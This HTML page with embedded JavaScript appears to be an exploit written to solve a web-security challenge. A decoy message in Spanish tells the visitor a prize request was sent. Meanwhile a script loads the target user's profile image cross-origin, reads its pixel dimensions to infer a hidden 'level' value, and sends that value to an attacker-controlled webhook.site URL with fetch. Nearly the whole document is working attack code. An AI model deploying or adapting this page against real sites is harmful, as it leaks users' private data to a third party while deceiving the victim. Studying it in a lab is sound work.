<!DOCTYPE html>
<html>
<head>
    <title>Procesando Solicitud</title>
    <meta charset="UTF-8">
</head>
<body>

    <h1>‚úÖ Solicitud de premio enviada. Por favor, vuelva a la pesta√±a anterior.</h1>
    <p>El procesamiento es autom√°tico y no requiere m√°s interacci√≥n.</p>
    
    <div id="log" style="font-family: monospace; font-size: 10px;"></div>

    <script>
        // Funci√≥n para agregar mensajes al log en la p√°gina
        function logMessage(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const color = type === 'success' ? 'green' : type === 'error' ? 'red' : 'blue';
            logDiv.innerHTML += `<p style="color: ${color}; margin: 5px 0;">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
        }

        logMessage("Inicio de script. Intentando cargar la imagen de Pepe...");

        // 1. CONFIGURACI√ìN
        const DOMINIO_DESAFIO = "https://chl-0be918a6-5b4f-4de5-b30a-669e10a3cf51-imagen-importante.softwareseguro.com.ar";
        const URL_IMAGEN_PEPE = DOMINIO_DESAFIO + "/profile-pic?user=pepe"; // Usamos la suposici√≥n del par√°metro 'user=pepe'
        
        // üö® URL PARA REPORTAR EL RESULTADO (T√ö BACKEND)
        // Usa una URL tuya que puedas monitorear, o una URL de prueba (RequestBin/Webhook.site).
        // Ejemplo ficticio:
        const URL_REPORTE = "https://webhook.site/b16b1ec0-3ad6-4733-8c07-06d49d46297f";

        // 2. Crear un elemento de imagen oculto
        const img = new Image();
        img.crossOrigin = "anonymous"; 
        
        // 3. CAPTURA DEL EVENTO LOAD Y C√ÅLCULO
        img.onload = function() {
            logMessage("Evento 'onload' capturado. Leyendo dimensiones...", 'info');
            
            const ancho = img.naturalWidth;
            const alto = img.naturalHeight;
            const nivel = ancho * alto;

            if (ancho <= 1 || alto <= 1 || nivel === 0) {
                 logMessage(`‚ùå FALLA DE LECTURA (SOP/Bloqueo): Nivel=0. El navegador bloque√≥ la lectura.`, 'error');
            } else {
                // 4. √âXITO Y REPORTE
                logMessage(`‚úÖ √âXITO: Dimensiones: ${ancho}x${alto}. Nivel de Pepe: ${nivel}`, 'success');
                
                // Generar la URL de reporte
                const finalReportUrl = URL_REPORTE + nivel;

                // Enviar el Nivel al "backend" (simulaci√≥n por GET request)
                fetch(finalReportUrl)
                    .then(() => logMessage(`‚úÖ Dato de Nivel enviado exitosamente a ${finalReportUrl}`, 'success'))
                    .catch(() => logMessage(`‚ö†Ô∏è Fallo al enviar el reporte. Revisa la URL de reporte.`, 'error'));

                // Opcional: Cerrar ventana
                // setTimeout(() => { window.close(); }, 3000); 
            }
        };
        
        img.onerror = function() {
            logMessage(`‚ùå ERROR FATAL: No se pudo cargar la imagen desde ${URL_IMAGEN_PEPE}. Revisa la URL.`, 'error');
        };

        // 5. Iniciar la carga de la imagen (se ejecuta al inicio)
        img.src = URL_IMAGEN_PEPE;
    </script>
</body>
</html>
